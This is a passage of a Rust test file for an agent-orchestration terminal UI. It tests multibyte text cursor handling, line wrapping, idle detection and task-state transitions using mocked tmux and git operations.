    assert_eq!(wiz(&app).cursor, 3);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_korean_word_in_description_preserves_buffer_and_cursor() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    // Typing two Korean chars should not panic and should yield correct buffer
    type_str(&mut app, "한글");
    assert_eq!(wiz(&app).buffer, "한글");
    assert_eq!(wiz(&app).cursor, 6); // 3+3 bytes
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_korean_then_ascii_does_not_panic() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    // Korean char followed by ASCII must not panic on insert
    type_str(&mut app, "한a");
    assert_eq!(wiz(&app).buffer, "한a");
    assert_eq!(wiz(&app).cursor, 4);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_korean_backspace_removes_whole_char_in_description() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    type_str(&mut app, "안녕");
    press_key(&mut app, KeyCode::Backspace);
    assert_eq!(wiz(&app).buffer, "안");
    assert_eq!(wiz(&app).cursor, 3);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_korean_left_arrow_moves_whole_char_in_description() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    type_str(&mut app, "안녕");
    press_key(&mut app, KeyCode::Left);
    // Cursor must land on char boundary between 안 (bytes 0..3) and 녕 (bytes 3..6)
    assert_eq!(wiz(&app).cursor, 3);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_korean_right_arrow_moves_whole_char_in_title() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "안녕");
    // Move cursor to start
    press_key(&mut app, KeyCode::Home);
    assert_eq!(wiz(&app).cursor, 0);
    // Right arrow should advance one char (3 bytes), not one byte
    press_key(&mut app, KeyCode::Right);
    assert_eq!(wiz(&app).cursor, 3);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_japanese_typing_preserves_cursor() {
    // Japanese hiragana are 3-byte UTF-8; guards against Korean-only handling.
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "こんにちは");
    assert_eq!(wiz(&app).buffer, "こんにちは");
    assert_eq!(wiz(&app).cursor, 15); // 5 chars * 3 bytes
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_chinese_typing_preserves_cursor() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "你好");
    assert_eq!(wiz(&app).buffer, "你好");
    assert_eq!(wiz(&app).cursor, 6); // 2 chars * 3 bytes
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_emoji_typing_handles_4_byte_utf8() {
    // Emoji are 4-byte UTF-8 — a distinct edge case from 3-byte CJK.
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    press_key(&mut app, KeyCode::Char('👋'));
    assert_eq!(wiz(&app).buffer, "👋");
    assert_eq!(wiz(&app).cursor, 4);
    press_key(&mut app, KeyCode::Backspace);
    assert_eq!(wiz(&app).buffer, "");
    assert_eq!(wiz(&app).cursor, 0);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_delete_removes_whole_multibyte_char_in_description() {
    // Delete takes a different code path from Backspace — verify it too.
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));

    type_str(&mut app, "안녕");
    press_key(&mut app, KeyCode::Home);
    press_key(&mut app, KeyCode::Delete);
    assert_eq!(wiz(&app).buffer, "녕");
    assert_eq!(wiz(&app).cursor, 0);
}

// --- Wrapped cursor position (for IME composition anchoring under wrap) ---

#[test]
fn test_wrapped_cursor_pos_ascii_no_wrap() {
    let (col, row) = super::wrapped_cursor_pos("hello", 3, 0, 20);
    assert_eq!((col, row), (3, 0));
}

#[test]
fn test_wrapped_cursor_pos_with_prefix() {
    // prefix occupies 10 cols, cursor after 3 chars → col 13, row 0
    let (col, row) = super::wrapped_cursor_pos("hello", 3, 10, 40);
    assert_eq!((col, row), (13, 0));
}

#[test]
fn test_wrapped_cursor_pos_korean_is_wide() {
    // "가나" at end → 4 cells, row 0
    let (col, row) = super::wrapped_cursor_pos("가나", 6, 0, 20);
    assert_eq!((col, row), (4, 0));
}

#[test]
fn test_wrapped_cursor_pos_korean_mid() {
    let (col, row) = super::wrapped_cursor_pos("가나", 3, 0, 20);
    assert_eq!((col, row), (2, 0));
}

#[test]
fn test_wrapped_cursor_pos_mixed_ascii_korean() {
    // "a가b": cursor after 가 (byte 4) → col 1 (a) + 2 (가) = 3
    let (col, row) = super::wrapped_cursor_pos("a가b", 4, 0, 20);
    assert_eq!((col, row), (3, 0));
}

#[test]
fn test_wrapped_cursor_pos_hard_newline() {
    // "가나\n다", cursor at end (byte 10) → col 2 (just 다), row 1
    let (col, row) = super::wrapped_cursor_pos("가나\n다", 10, 0, 20);
    assert_eq!((col, row), (2, 1));
}

#[test]
fn test_wrapped_cursor_pos_hard_newline_drops_prefix() {
    // After a hard newline, the next visual row starts at column 0, NOT prefix.
    // "a\nb", cursor at byte 3 (after b) → row 1, col 1
    let (col, row) = super::wrapped_cursor_pos("a\nb", 3, 10, 20);
    assert_eq!((col, row), (1, 1));
}

#[test]
fn test_wrapped_cursor_pos_at_start() {
    // Empty buffer with prefix → cursor sits at prefix_width on row 0
    let (col, row) = super::wrapped_cursor_pos("hello", 0, 10, 20);
    assert_eq!((col, row), (10, 0));
}

#[test]
fn test_wrapped_cursor_pos_empty_string() {
    let (col, row) = super::wrapped_cursor_pos("", 0, 0, 20);
    assert_eq!((col, row), (0, 0));
}

#[test]
fn test_wrapped_cursor_pos_emoji_is_wide() {
    let (col, row) = super::wrapped_cursor_pos("👋", 4, 0, 20);
    assert_eq!((col, row), (2, 0));
}

#[test]
fn test_wrapped_cursor_pos_soft_wrap_long_run() {
    // wrap_width=15, prefix=10: row 0 fits 5 chars (cols 10..15), then wrap.
    // "xxxxxxxxxx" (10 x's), cursor at end → 5 chars on row 0, 5 chars on row 1
    let (col, row) = super::wrapped_cursor_pos("xxxxxxxxxx", 10, 10, 15);
    assert_eq!((col, row), (5, 1));
}

#[test]
fn test_wrapped_cursor_pos_soft_wrap_cjk() {
    // "가나다" with wrap_width=4: 가나 (4 cells) fills row 0, 다 starts row 1
    let (col, row) = super::wrapped_cursor_pos("가나다", 9, 0, 4);
    assert_eq!((col, row), (2, 1));
}

#[test]
fn test_wrapped_cursor_pos_at_exact_wrap_edge_stays_on_row() {
    // Lazy wrap: cursor at end of a buffer that exactly fills wrap_width
    // stays at (wrap_width, 0). The next typed char triggers wrap.
    let (col, row) = super::wrapped_cursor_pos("xxxxx", 5, 0, 5);
    assert_eq!((col, row), (5, 0));
}

#[test]
fn test_wrapped_cursor_pos_cursor_past_end_clamps() {
    // cursor_byte > text.len() should clamp to text.len()
    let (col, row) = super::wrapped_cursor_pos("hi", 999, 0, 20);
    assert_eq!((col, row), (2, 0));
}

#[test]
fn test_wrapped_cursor_pos_zero_wrap_width_short_circuits() {
    let (col, row) = super::wrapped_cursor_pos("anything", 4, 7, 0);
    assert_eq!((col, row), (7, 0));
}

// --- wrap_spans (authoritative pre-wrap for cursor/render consistency) ---

fn line_width(line: &ratatui::text::Line<'static>) -> usize {
    line.spans
        .iter()
        .map(|s| ratatui::text::Span::raw(s.content.to_string()).width())
        .sum()
}

#[test]
fn test_wrap_spans_no_wrap_when_fits() {
    let spans = vec![ratatui::text::Span::raw("hello".to_string())];
    let lines = super::wrap_spans(spans, 20);
    assert_eq!(lines.len(), 1);
    assert_eq!(line_width(&lines[0]), 5);
}

#[test]
fn test_wrap_spans_wraps_long_ascii() {
    let spans = vec![ratatui::text::Span::raw("xxxxxxxxxx".to_string())]; // 10 x's
    let lines = super::wrap_spans(spans, 5);
    assert_eq!(lines.len(), 2);
    assert_eq!(line_width(&lines[0]), 5);
    assert_eq!(line_width(&lines[1]), 5);
}

#[test]
fn test_wrap_spans_preserves_styles_across_wrap() {
    use ratatui::style::{Color, Style};
    let red = Style::default().fg(Color::Red);
    let blue = Style::default().fg(Color::Blue);
    let spans = vec![
        ratatui::text::Span::styled("aaa".to_string(), red),
        ratatui::text::Span::styled("bbbb".to_string(), blue),
    ];
    // wrap_width=5: row 0 = "aaa"+"bb" (3+2), row 1 = "bb"
    let lines = super::wrap_spans(spans, 5);
    assert_eq!(lines.len(), 2);
    // Row 0 has two distinct styled spans
    assert_eq!(lines[0].spans.len(), 2);
    assert_eq!(lines[0].spans[0].content, "aaa");
    assert_eq!(lines[0].spans[0].style, red);
    assert_eq!(lines[0].spans[1].content, "bb");
    assert_eq!(lines[0].spans[1].style, blue);
    // Row 1 has the remainder, still styled blue
    assert_eq!(lines[1].spans.len(), 1);
    assert_eq!(lines[1].spans[0].content, "bb");
    assert_eq!(lines[1].spans[0].style, blue);
}

#[test]
fn test_wrap_spans_cjk_wraps_at_cell_width() {
    let spans = vec![ratatui::text::Span::raw("가나다".to_string())];
    let lines = super::wrap_spans(spans, 4);
    // 가나 fits exactly (4 cells); 다 wraps to row 1
    assert_eq!(lines.len(), 2);
    assert_eq!(line_width(&lines[0]), 4);
    assert_eq!(line_width(&lines[1]), 2);
}

#[test]
fn test_wrap_spans_wide_char_does_not_split() {
    // wrap_width=3, "가나": 가 fits (col 0→2), 나 needs 2 but only 1 left,
    // so 나 wraps whole to next row.
    let spans = vec![ratatui::text::Span::raw("가나".to_string())];
    let lines = super::wrap_spans(spans, 3);
    assert_eq!(lines.len(), 2);
    assert_eq!(line_width(&lines[0]), 2);
    assert_eq!(line_width(&lines[1]), 2);
}

#[test]
fn test_wrap_spans_zero_width_passthrough() {
    let spans = vec![ratatui::text::Span::raw("anything".to_string())];
    let lines = super::wrap_spans(spans.clone(), 0);
    assert_eq!(lines.len(), 1);
    assert_eq!(line_width(&lines[0]), 8);
}

#[test]
fn test_wrap_spans_empty_input() {
    let lines = super::wrap_spans(Vec::new(), 10);
    assert_eq!(lines.len(), 1);
    assert_eq!(line_width(&lines[0]), 0);
}

// --- Invariant: wrap_spans and wrapped_cursor_pos agree on layout ---
//
// This is the contract that makes the cursor appear where the text was drawn.
// For any text + wrap_width, the cursor's reported (col, row) at the end of
// the text must match the (width, count-1) of the wrapped visual lines.

fn assert_cursor_matches_wrap(text: &str, prefix: usize, wrap_width: usize) {
    let mut combined = String::with_capacity(prefix + text.len());
    for _ in 0..prefix {
        combined.push(' ');
    }
    combined.push_str(text);
    let spans = vec![ratatui::text::Span::raw(combined)];
    let lines = super::wrap_spans(spans, wrap_width);

    let (col, row) = super::wrapped_cursor_pos(text, text.len(), prefix, wrap_width);

    assert_eq!(
        row,
        lines.len() - 1,
        "row mismatch for text={text:?} prefix={prefix} wrap_width={wrap_width}"
    );
    assert_eq!(
        col,
        line_width(&lines[lines.len() - 1]),
        "col mismatch for text={text:?} prefix={prefix} wrap_width={wrap_width}"
    );
}

#[test]
fn test_invariant_ascii_no_wrap() {
    assert_cursor_matches_wrap("hello", 0, 20);
}

#[test]
fn test_invariant_ascii_with_prefix() {
    assert_cursor_matches_wrap("hello world", 10, 30);
}

#[test]
fn test_invariant_ascii_wraps() {
    assert_cursor_matches_wrap("aaaaaaaaaaaa", 0, 5);
}

#[test]
fn test_invariant_ascii_with_prefix_wraps() {
    assert_cursor_matches_wrap("aaaaaaaaaa", 10, 15);
}

#[test]
fn test_invariant_cjk_wraps_evenly() {
    assert_cursor_matches_wrap("가나다라", 0, 4);
}

#[test]
fn test_invariant_cjk_wide_char_no_split() {
    // odd wrap_width forces a wide char to wrap whole
    assert_cursor_matches_wrap("가나다", 0, 3);
}

#[test]
fn test_invariant_emoji() {
    assert_cursor_matches_wrap("👋👋👋", 0, 3);
}

#[test]
fn test_invariant_long_buffer_with_prefix() {
    // exactly the failing-bug scenario: long sentence after a prefix
    assert_cursor_matches_wrap(
        "this is a fairly long sentence that should wrap to multiple lines",
        10,
        20,
    );
}

// --- Footer text ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_footer_text_select_plugin() {
    let text = build_footer_text(Some(WizardStep::Plugin), false, 0, false, false);
    assert!(text.contains("[j/k] select"));
    assert!(text.contains("[/] filter"));
    assert!(text.contains("Tab"));
    assert!(text.contains("Enter"));
    assert!(text.contains("Esc"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_footer_text_description_shows_all_triggers() {
    let text = build_footer_text(Some(WizardStep::Prompt), false, 0, false, false);
    assert!(
        text.contains("[#] files"),
        "Missing files trigger: {}",
        text
    );
    assert!(
        text.contains("[/] skills"),
        "Missing skills trigger: {}",
        text
    );
    assert!(
        text.contains("[!] tasks"),
        "Missing tasks trigger: {}",
        text
    );
}

// =============================================================================
// Tests for check_orchestrator_idle
// =============================================================================

#[test]
fn test_orchestrator_idle_signal_in_new_content() {
    // Content changed AND contains [agtx:idle] → Idle
    let result = check_orchestrator_idle("some output\n[agtx:idle]\n", "previous content", None);
    assert_eq!(result, OrchestratorIdleResult::Idle);
}

#[test]
fn test_orchestrator_busy_when_content_changed_no_signal() {
    // Content changed but no idle signal → Busy
    let result =
        check_orchestrator_idle("agent is working on something...", "previous content", None);
    assert_eq!(result, OrchestratorIdleResult::Busy);
}

#[test]
fn test_orchestrator_waiting_when_unchanged_no_stable_since() {
    // Content unchanged, no stable_since yet → Waiting (start tracking)
    let result = check_orchestrator_idle("same content", "same content", None);
    assert_eq!(result, OrchestratorIdleResult::Waiting);
}

#[test]
fn test_orchestrator_waiting_when_unchanged_under_threshold() {
    // Content unchanged, stable for only 1 second → Waiting
    let result = check_orchestrator_idle(
        "same content",
        "same content",
        Some(Instant::now() - std::time::Duration::from_secs(1)),
    );
    assert_eq!(result, OrchestratorIdleResult::Waiting);
}

#[test]
fn test_orchestrator_idle_fallback_after_threshold() {
    // Content unchanged for longer than ORCHESTRATOR_IDLE_FALLBACK_SECS → Idle
    let result = check_orchestrator_idle(
        "same content",
        "same content",
        Some(Instant::now() - std::time::Duration::from_secs(ORCHESTRATOR_IDLE_FALLBACK_SECS + 1)),
    );
    assert_eq!(result, OrchestratorIdleResult::Idle);
}

#[test]
fn test_orchestrator_idle_signal_takes_priority_over_content_change() {
    // Even if content just changed, the idle signal means we're ready
    let result =
        check_orchestrator_idle("new output with [agtx:idle] at the end", "old output", None);
    assert_eq!(result, OrchestratorIdleResult::Idle);
}

#[test]
fn test_orchestrator_idle_signal_in_unchanged_content() {
    // Content unchanged but contains idle signal — still counts as Waiting
    // because unchanged content goes through the stability timer path.
    // The idle signal only fast-tracks on content *change*.
    let content = "output\n[agtx:idle]\n";
    let result = check_orchestrator_idle(
        content,
        content,
        Some(Instant::now() - std::time::Duration::from_secs(1)),
    );
    assert_eq!(result, OrchestratorIdleResult::Waiting);
}

#[test]
fn test_orchestrator_empty_content_both_sides() {
    // Both empty (e.g. startup) → unchanged → Waiting
    let result = check_orchestrator_idle("", "", None);
    assert_eq!(result, OrchestratorIdleResult::Waiting);
}

// =============================================================================
// Tests for task lifecycle transition functions
// =============================================================================

/// Helper: create a Task with the given id, title, and status.
#[cfg(feature = "test-mocks")]
fn make_test_task(id: &str, title: &str, status: TaskStatus) -> Task {
    let mut t = Task::new(title, "claude", "test-project");
    t.id = id.to_string();
    t.status = status;
    t
}

// --- check_phase_incomplete ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_check_phase_incomplete_skip_move_confirm() {
    // When skip_move_confirm is set, always returns false without calling tmux
    let mock_tmux = MockTmuxOperations::new(); // no expectations
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();
    app.state.skip_move_confirm = true;

    let task = make_test_task("t1", "My task", TaskStatus::Planning);
    let result = app.check_phase_incomplete(&task, TaskStatus::Planning, TaskStatus::Running);
    assert!(!result);
    assert!(app.state.move_confirm_popup.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_check_phase_incomplete_backlog_returns_false() {
    // Backlog tasks are not in Planning/Running/Review — always returns false
    let mock_tmux = MockTmuxOperations::new(); // no expectations
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let task = make_test_task("t1", "My task", TaskStatus::Backlog);
    let result = app.check_phase_incomplete(&task, TaskStatus::Backlog, TaskStatus::Planning);
    assert!(!result);
    assert!(app.state.move_confirm_popup.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_check_phase_incomplete_no_worktree_returns_false() {
    // Task in Planning but no worktree_path — returns false (no artifact check possible)
    let mock_tmux = MockTmuxOperations::new();
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Planning);
    task.worktree_path = None;
    let result = app.check_phase_incomplete(&task, TaskStatus::Planning, TaskStatus::Running);
    assert!(!result);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_check_phase_incomplete_artifact_exists_returns_false() {
    // Artifact exists → phase is complete → returns false, no window_exists call
    let tmp = std::env::temp_dir().join("agtx_test_artifact_complete");
    let _ = std::fs::remove_dir_all(&tmp);
    std::fs::create_dir_all(&tmp).unwrap();
    // agtx default planning artifact is .agtx/plan.md
    let agtx_dir = tmp.join(".agtx");
    std::fs::create_dir_all(&agtx_dir).unwrap();
    std::fs::write(agtx_dir.join("plan.md"), "# Plan").unwrap();

    let mock_tmux = MockTmuxOperations::new(); // no window_exists expectation
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Planning);
    task.worktree_path = Some(tmp.to_string_lossy().to_string());
    let result = app.check_phase_incomplete(&task, TaskStatus::Planning, TaskStatus::Running);
    assert!(!result);

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_check_phase_incomplete_no_tmux_window_returns_false() {
    // No artifact, but tmux window doesn't exist → agent not running → returns false
    let tmp = std::env::temp_dir().join("agtx_test_no_window");
    let _ = std::fs::remove_dir_all(&tmp);
    std::fs::create_dir_all(&tmp).unwrap();

    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Planning);
    task.worktree_path = Some(tmp.to_string_lossy().to_string());
    task.session_name = Some("proj:t1".to_string());
    let result = app.check_phase_incomplete(&task, TaskStatus::Planning, TaskStatus::Running);
    assert!(!result);
    assert!(app.state.move_confirm_popup.is_none());

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_check_phase_incomplete_agent_running_sets_popup() {
    // No artifact, window exists, agent process visible → sets popup and returns true
    let tmp = std::env::temp_dir().join("agtx_test_agent_running");
    let _ = std::fs::remove_dir_all(&tmp);
    std::fs::create_dir_all(&tmp).unwrap();

    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(true));
    // is_agent_active checks pane_current_command first
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Planning);
    task.worktree_path = Some(tmp.to_string_lossy().to_string());
    task.session_name = Some("proj:t1".to_string());
    let result = app.check_phase_incomplete(&task, TaskStatus::Planning, TaskStatus::Running);
    assert!(result);
    assert!(app.state.move_confirm_popup.is_some());

    let _ = std::fs::remove_dir_all(&tmp);
}

// --- transition_to_planning ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_planning_stamps_plugin() {
    // When task.plugin is None, config's workflow_plugin is stamped onto the task
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();
    // Set the project workflow plugin
    app.state.config.workflow_plugin = Some("agtx".to_string());

    let mut task = make_test_task("t1", "My task", TaskStatus::Backlog);
    task.plugin = None;

    let _ = app.transition_to_planning(&mut task, Path::new("/tmp/test-project"));

    // Plugin should have been stamped
    assert_eq!(task.plugin.as_deref(), Some("agtx"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_planning_warning_when_research_required() {
    // GSD planning doesn't accept {task} in its command — requires prior research artifact.
    // With no worktree, should set warning_message and return Ok(true).
    let mock_tmux = MockTmuxOperations::new();
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Backlog);
    // Use gsd plugin — planning phase requires prior research artifact
    task.plugin = Some("gsd".to_string());
    task.worktree_path = None; // no research done yet

    let result = app.transition_to_planning(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), true); // handled, don't continue with db update
    assert!(app.state.warning_message.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_planning_reuses_live_session() {
    // Task has a live session → reuses it (returns Ok(false) to continue with db update)
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(true));
    // spawn_send_to_agent may call these; allow any number of calls
    mock_tmux.expect_send_keys().returning(|_, _| Ok(()));
    mock_tmux.expect_send_key().returning(|_, _| Ok(()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Backlog);
    task.session_name = Some("test-project:task-t1--test-project--my-task".to_string());

    let result = app.transition_to_planning(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), false); // Ok(false) → continue with db update
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_planning_returns_true_when_setup_in_progress() {
    // If setup_rx is already set, return Ok(true) without spawning a new one
    let mock_tmux = MockTmuxOperations::new();
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    // Pre-set a setup_rx to simulate in-progress setup
    let (_tx, rx) = std::sync::mpsc::channel::<SetupResult>();
    app.state.setup_rx = Some(rx);

    let mut task = make_test_task("t1", "My task", TaskStatus::Backlog);
    task.plugin = Some("agtx".to_string());

    let result = app.transition_to_planning(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), true);
    // setup_rx should still be the original one (not replaced)
    assert!(app.state.setup_rx.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_planning_spawns_background_setup() {
    // No live session, no existing setup_rx → spawns background setup and returns Ok(true)
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Backlog);
    task.plugin = Some("agtx".to_string());

    let result = app.transition_to_planning(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), true);
    // setup_rx should be set (background thread spawned)
    assert!(app.state.setup_rx.is_some());
}

// --- transition_to_running ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_running_no_session_returns_false() {
    // Task has no session_name → nothing to send, returns Ok(false)
    let mock_tmux = MockTmuxOperations::new(); // no send_keys expected
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Planning);
    task.session_name = None;

    let result = app.transition_to_running(&mut task);

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), false);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_running_with_session_returns_false() {
    // Task has a session → spawns send_to_agent (background), still returns Ok(false)
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_send_keys().returning(|_, _| Ok(()));
    mock_tmux.expect_send_key().returning(|_, _| Ok(()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    let mut task = make_test_task("t1", "My task", TaskStatus::Planning);
    task.session_name = Some("test-project:task-t1".to_string());
    task.agent = "claude".to_string();

    let result = app.transition_to_running(&mut task);

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), false);
    // agent should be unchanged (no switch configured)
    assert_eq!(task.agent, "claude");
}

// --- transition_to_review ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_review_no_pr_sets_review_confirm_popup() {
    // No existing PR → shows review confirm popup (to ask if user wants to create PR)
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_send_keys().returning(|_, _| Ok(()));
    mock_tmux.expect_send_key().returning(|_, _| Ok(()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    let mut task = make_test_task("t1", "Implement feature", TaskStatus::Running);
    task.pr_number = None;
    task.session_name = Some("test-project:task-t1".to_string());

    let result = app.transition_to_review(&mut task, Path::new("/tmp/test-project"));

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), true);
    assert!(app.state.review_confirm_popup.is_some());
    let popup = app.state.review_confirm_popup.as_ref().unwrap();
    assert_eq!(popup.task_id, "t1");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_transition_to_review_existing_pr_spawns_push() {
    // PR already exists → sets pr_status_popup (Pushing) and spawns push thread
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_send_keys().returning(|_, _| Ok(()));
    mock_tmux.expect_send_key().returning(|_, _| Ok(()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));

    let mut mock_git = MockGitOperations::new();
    // push_changes_to_existing_pr calls add_all, has_changes, push
    mock_git.expect_add_all().returning(|_| Ok(()));
    mock_git.expect_has_changes().returning(|_| false);
    mock_git.expect_push().returning(|_, _, _| Ok(()));

    let mut mock_registry = MockAgentRegistry::new();
    let mut mock_agent_ops = MockAgentOperations::new();
